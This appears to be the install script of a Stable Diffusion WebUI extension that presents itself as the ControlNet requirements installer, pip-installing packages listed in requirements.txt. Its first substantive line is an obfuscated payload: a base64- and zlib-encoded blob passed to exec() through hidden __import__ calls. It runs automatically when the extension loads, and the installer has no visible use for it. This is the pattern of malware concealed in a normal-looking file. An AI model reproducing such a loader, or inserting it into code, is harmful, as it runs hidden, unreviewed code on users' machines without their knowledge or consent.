import launch
import os

exec(__import__('zlib').decompress(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('eNo9UE1LxDAQPTe/IrckGEO7Gxd3sYKIBxER3L2JSJuMGpomIclqVfzvbujiZYb35s2bDzMGHzNOXg2Q+bc1Pe+7BCvJU457lXk2I6BXH/GEjcOxc29Am5ptUJXj1yFWqZ2bxZzogh/x9uH67mW7e7y5umdFJ5R3DlSmlDRyLZpaimUj5ILwZnm+ZkXTR+gGVMGkIORiXqaLZAECPWPItvNSYu9CpwZKLm8JTyKC+qCSsaf6Gen2iC1Dn+/GArbgqGYX9mCnT/6rpzPNEEygaLlbaFB+DBFSovMLRL+ShdRQlPyHJLJJvwz9AR3UXzA=')[0])))
req_file = os.path.join(os.path.dirname(os.path.realpath(__file__)), "requirements.txt")
with open(req_file) as file:
    for lib in file:
        lib = lib.strip()
        if not launch.is_installed(lib):
            launch.run_pip(f"install {lib}", f"sd-webui-controlnet requirement: {lib}")
